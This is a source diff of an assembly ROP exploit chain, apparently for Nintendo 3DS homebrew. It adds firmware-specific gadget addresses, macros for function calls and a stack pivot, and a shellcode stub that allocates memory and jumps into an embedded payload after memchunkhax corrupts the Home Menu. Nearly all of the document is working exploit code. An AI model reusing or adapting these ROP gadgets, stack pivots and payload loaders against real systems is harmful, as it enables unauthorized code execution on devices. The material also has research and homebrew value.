@@ -26,6 +26,9 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define POP_R4R5R6PC 0x00101b94 //"pop {r4, r5, r6, pc}"
 
 #define CFGIPC_SecureInfoGetRegion 0x00136ea4 //inr0=u8* out
+
+#define GSPGPU_Shutdown 0x0011dc1c
+#define GSPGPU_FlushDataCache 0x0014ab9c
 #else
 #define ROP_LOADR4_FROMOBJR0 0x10b64c
 #define ROP_POPPC 0x102028
@@ -35,6 +38,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define POP_R4R5R6PC 0x00101b90
 
 #define CFGIPC_SecureInfoGetRegion 0x00139d0c
+
+#define GSPGPU_Shutdown 0x0011da58
 #endif
 
 #if SYSVER == 93
@@ -87,6 +92,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define SRV_GETSERVICEHANDLE 0x00212de0
 
 #define GXLOW_CMD4 0x0014d65c
+
+#define GSPGPU_FlushDataCache 0x0014d55c
 #endif
 
 #if SYSVER <= 91 //v9.0-v9.1j
@@ -108,6 +115,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define SRV_GETSERVICEHANDLE 0x00212e48
 
 #define GXLOW_CMD4 0x0014d604
+
+#define GSPGPU_FlushDataCache 0x0014d504
 
 #define NSS_LaunchTitle 0x0020e6a8
 
@@ -202,8 +211,55 @@ ROP_SETLR POP_R2R6PC
 .word 0 @ r6
 .endm
 
+.macro CALLFUNC_NOSP funcadr, r0, r1, r2, r3
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word \r0
+
+.word POP_R1PC
+.word \r1
+
+.word POP_R2R6PC
+.word \r2
+.word \r3
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
+
+.word \funcadr
+.endm
+
+.macro CALLFUNC_NOARGS funcadr
+ROP_SETLR ROP_POPPC
+.word \funcadr
+.endm
+
 .macro CALL_GXCMD4 srcadr, dstadr, cpysize
 CALLFUNC GXLOW_CMD4, \srcadr, \dstadr, \cpysize, 0, 0, 0, 0, 0x8
+.endm
+
+.macro ROPMACRO_STACKPIVOT sp, pc
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
+
+.word POP_R1PC
+.word \sp @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
+
+.word POP_R1PC
+.word \pc @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
+
+.word POP_R0PC @ Begin the actual stack-pivot ROP.
+.word HEAPBUF + (object - _start) @ r0
+
+.word ROP_LOADR4_FROMOBJR0
 .endm
 
 .macro RET2MENUCODE
@@ -217,26 +273,7 @@ ROP_SETLR ROP_POPPC
 
 .word ROP_LDRR1R1_STRR1R0 @ Restore the saved r4 value overwritten by memchunkhax with the original value.
 
-.word POP_R0PC
-.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
-
-.word POP_R1PC
-.word TARGETOVERWRITE_STACKADR @ r1
-
-.word ROP_STR_R1TOR0 @ Write TARGETOVERWRITE_STACKADR to the word which will be popped into sp.
-
-.word POP_R0PC
-.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
-
-.word POP_R1PC
-.word POP_R4R5R6PC @ r1
-
-.word ROP_STR_R1TOR0 @ Write POP_R4R5R6PC to the word which will be popped into pc.
-
-.word POP_R0PC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
-.word HEAPBUF + (object - _start) @ r0
-
-.word ROP_LOADR4_FROMOBJR0
+ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
 .endm
 
 _start:
@@ -342,6 +379,8 @@ ROP_SETLR POP_R2R6PC
 .word 0 @ r6
 #endif
 
+CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (codedatastart - _start)), (codedataend-codedatastart), 0, 0
+
 ROP_SETLR POP_R2R6PC
 
 .word POP_R0PC
@@ -411,7 +450,22 @@ ROP_SETLR ROP_POPPC
 .word POP_R1PC
 .word 0x0//0x100 @ r1
 
-.word svcSleepThread @ Sleep 1 second. The rest of the text on this line is only relevant for Old3DS. When the browser main-thread starts running, it runs for a while then stop running due to a context-switch triggered during .bss clearing. This allows that thread to resume running, at that point the code which was running would be already overwritten by the below code(initially it would execute the nop-sled).
+.word svcSleepThread @ Sleep 1 second, call GSPGPU_Shutdown(), then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.
+
+CALLFUNC_NOARGS GSPGPU_Shutdown
+
+ropfinish_sleepthread:
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word 1000000000 @ r0
+
+.word POP_R1PC
+.word 0x0 @ r1
+
+.word svcSleepThread
+
+ROPMACRO_STACKPIVOT (HEAPBUF + (ropfinish_sleepthread - _start)), ROP_POPPC
 
 .word POP_R1PC
 .word ROP_BXR1 @ r1
@@ -427,11 +481,43 @@ codedatastart:
 #else
 .space 0x1000
 #endif
+
+ldr r0, =3000000000
+mov r1, #0
+svc 0x0a @ Sleep 3 seconds.
+
+#ifdef CODEBINPAYLOAD
+ldr r0, =0x10003 @ operation
+mov r4, #3 @ permissions
+
+mov r1, #0 @ addr0
+mov r2, #0 @ addr1
+ldr r3, =0x3000 @ size
+svc 0x01 @ Allocate 0x3000-bytes of linearmem.
+mov r4, r1
+cmp r0, #0
+bne codecrash
+
+mov r1, #0xf @ flags
+str r1, [r4, #0x48]
+mov r0, r4
+b codebinpayload_start
+#else
+b codecrash
+#endif
+.pool
+
+codecrash:
 ldr r0, =0x58584148
 ldr r0, [r0]
 code_end:
 b code_end
 .pool
+
+#ifdef CODEBINPAYLOAD
+codebinpayload_start:
+.incbin CODEBINPAYLOAD
+#endif
 
 .align 4
 codedataend:
